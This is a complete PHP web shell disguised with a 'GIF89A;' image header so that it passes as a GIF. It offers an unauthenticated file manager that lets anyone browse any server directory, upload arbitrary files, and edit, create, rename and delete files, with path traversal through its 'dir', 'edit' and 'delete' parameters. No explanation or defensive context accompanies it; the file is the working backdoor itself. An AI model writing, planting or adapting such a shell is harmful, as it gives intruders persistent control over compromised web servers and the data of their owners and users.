GIF89A;
<!DOCTYPE html>
<html>
<head>
<?php
session_start();

$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;

function list_directory($dir) {
    $files = array_diff(scandir($dir), array('.', '..'));
    echo '<ul>';
    foreach ($files as $file) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $file);
        $color = '';

        if (is_readable($path) && is_writable($path)) {
            $color = 'style="border-left: 4px solid green;"';
        } elseif (!is_writable($path)) {
            $color = 'style="border-left: 4px solid red;"';
        } elseif (is_readable($path)) {
            $color = 'style="border-left: 4px solid white;"';
        }

        echo '<li ' . $color . '>';
        if (is_dir($path)) {
            echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($file) . '</a>';
        } else {
            echo htmlspecialchars($file) . ' - ';
            echo '<a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> ';
            echo '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> ';
            echo '<a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a>';
        }
        echo '</li>';
    }
    echo '</ul>';
}

function upload_file($dir) {
    if (isset($_FILES['file'])) {
        $upload_file = $dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $upload_file);
    }
}

function create_directory($dir) {
    if (isset($_POST['dirname'])) {
        $new_dir = $dir . DIRECTORY_SEPARATOR . basename($_POST['dirname']);
        if (!file_exists($new_dir)) {
            mkdir($new_dir, 0777, true);
        }
    }
}

function create_file($dir) {
    if (isset($_POST['filename'])) {
        $new_file = $dir . DIRECTORY_SEPARATOR . basename($_POST['filename']);
        if (!file_exists($new_file)) {
            file_put_contents($new_file, '');
        }
    }
}

function edit_file($file_path) {
    if (isset($_POST['content'])) {
        file_put_contents($file_path, $_POST['content']);
    }
    $content = file_get_contents($file_path);
    echo '<form method="POST">';
    echo '<textarea name="content" style="width:100%;height:400px;">' . htmlspecialchars($content) . '</textarea><br>';
    echo '<input type="submit" value="Save">';
    echo '</form>';
}

function delete_file($file_path) {
    if (is_file($file_path)) {
        unlink($file_path);
    }
}

function rename_file($file_path) {
    if (isset($_POST['new_name'])) {
        $new_path = dirname($file_path) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        rename($file_path, $new_path);
    }
}

if (isset($_GET['delete'])) {
    delete_file($current_dir . DIRECTORY_SEPARATOR . $_GET['delete']);
}

if (isset($_GET['rename'])) {
    rename_file($current_dir . DIRECTORY_SEPARATOR . $_GET['rename']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    upload_file($current_dir);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['dirname'])) {
    create_directory($current_dir);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
    create_file($current_dir);
}

echo '<h2>Current Directory: ' . htmlspecialchars($current_dir) . '</h2>';

$parent_dir = dirname($current_dir);
echo '<p><a href="?dir=' . urlencode($parent_dir) . '">..</a></p>';

if (isset($_GET['edit'])) {
    edit_file($current_dir . DIRECTORY_SEPARATOR . $_GET['edit']);
} else {
    list_directory($current_dir);
    
    echo '<h3>Upload File</h3>';
    echo '<form method="POST" enctype="multipart/form-data">';
    echo '<input type="file" name="file">';
    echo '<input type="submit" value="Upload">';
    echo '</form>';
    
    echo '<h3>Create Directory</h3>';
    echo '<form method="POST">';
    echo '<input type="text" name="dirname" placeholder="Directory Name">';
    echo '<input type="submit" value="Create">';
    echo '</form>';
    
    echo '<h3>Create File</h3>';
    echo '<form method="POST">';
    echo '<input type="text" name="filename" placeholder="File Name">';
    echo '<input type="submit" value="Create">';
    echo '</form>';
    
    echo '<h3>Rename File</h3>';
    if (isset($_GET['rename'])) {
        echo '<form method="POST" action="?dir=' . urlencode($current_dir) . '&rename=' . urlencode($_GET['rename']) . '">';
        echo '<input type="text" name="new_name" value="' . htmlspecialchars($_GET['rename']) . '">';
        echo '<input type="submit" value="Rename">';
        echo '</form>';
    }
    
    echo '<h3>Delete File</h3>';
    echo '<form method="GET">';
    echo '<input type="hidden" name="dir" value="' . htmlspecialchars($current_dir) . '">';
    echo '<input type="text" name="delete">';
    echo '<input type="submit" value="Delete">';
    echo '</form>';
}
?>
